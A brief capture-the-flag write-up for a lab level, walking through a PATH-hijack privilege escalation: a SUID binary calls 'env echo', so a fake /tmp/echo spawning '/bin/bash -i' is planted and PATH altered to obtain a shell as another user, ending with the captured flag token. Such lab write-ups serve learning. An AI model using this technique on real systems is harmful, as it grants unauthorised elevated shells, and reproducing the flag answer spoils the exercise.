-ls found a suid file 
-using strings on file get us some informations, when we execute the file output => exploit me
-strings gives us that the suid calls /usr/bin/env echo Exploit me
-so we can create a new echo in /tmp and change the path to begin with /tmp => export path=“/tmp:$PATH”
-created file in tmp should be like: 
	#!/bin/bash
	
	/bin/bash -i
-chmod +x /tmp/echo
-run ./level03 and boom we are flag03
-launched get flag => qi0maab88jeaj46qoumi7maus
